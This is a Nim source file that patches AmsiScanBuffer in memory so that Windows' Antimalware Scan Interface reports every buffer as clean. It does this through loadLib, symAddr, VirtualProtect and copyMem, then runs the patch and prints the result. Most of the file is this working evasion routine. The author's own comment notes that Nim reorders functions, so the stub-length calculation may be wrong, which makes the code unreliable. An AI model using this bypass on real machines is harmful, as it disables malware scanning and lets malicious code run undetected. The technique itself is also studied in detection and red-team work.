#[
    Reference https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/#amsi_patch_C

    So this is an interesting problem: Nim doesn't preserve the order of the functions you define when it generates their C code counterparts.
    Because were doing some memory patching here, thats sorta needed. You could use the emit pragma for this (??) but then you'd have to deal with the missing symbols.

    Probably better off using another patching method.

    See https://nim-lang.org/docs/manual.html#implementation-specific-pragmas-emit-pragma if you're confused about the emit pragma
]#

import strformat
import dynlib
import winim/lean

type
    HAMSICONTEXT = HANDLE
    HAMSISESSION = HANDLE

    AMSI_RESULT = enum
        AMSI_RESULT_CLEAN = 0

proc AmsiScanBufferStub(amsiContext: HAMSICONTEXT, buffer: PVOID, length: ULONG, contentName: LPCWSTR, amsiSession: HAMSISESSION, rslt: ptr AMSI_RESULT): HRESULT =
    rslt[] = AMSI_RESULT_CLEAN
    return S_OK

proc AmsiScanBufferStubEnd(): VOID =
    discard

#[
{.emit: """
static HRESULT AmsiScanBufferStub(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

static VOID AmsiScanBufferStubEnd(VOID) {}
""".}

proc AmsiScanBufferStub(amsiContext: HAMSICONTEXT, buffer: PVOID, length: ULONG, contentName: LPCWSTR, amsiSession: HAMSISESSION, rslt: ptr AMSI_RESULT): HRESULT
    {.importc: "AmsiScanBufferStub", nodecl.}

proc AmsiScanBufferStubEnd(): VOID
    {.importc: "AmsiScanBufferStubEnd", nodecl.}
]#

proc DisableAMSI(): bool =
    var
        disabled: bool = false
        amsi: LibHandle
        stublen: DWORD
        op: DWORD
        t: DWORD
        cs: pointer

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled
    defer: amsi.unloadLib()

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    echo fmt"[*] AmsiScanBufferStubEnd: {cast[ULONG_PTR](AmsiScanBufferStubEnd)}"
    echo fmt"[*] AmsiScanBufferStub: {cast[ULONG_PTR](AmsiScanBufferStub)}"

    stublen = cast[DWORD]( (cast[ULONG_PTR](AmsiScanBufferStub) - cast[ULONG_PTR](AmsiScanBufferStubEnd)) )
    echo fmt"[*] Stub Length: {stublen}"

    if not VirtualProtect(cs, stublen, PAGE_EXECUTE_READWRITE, addr op):
        echo "[X] Failed calling VirtualProtect"
        return disabled

    copyMem(cs, AmsiScanBufferStub, stublen)
    disabled = true

    if not VirtualProtect(cs, stublen, op, addr t):
        echo "[X] Failed resetting memory back to it's orignal protections"

    return disabled

when isMainModule:
    var success = DisableAMSI()
    echo fmt"[*] AMSI disabled: {bool(success)}"
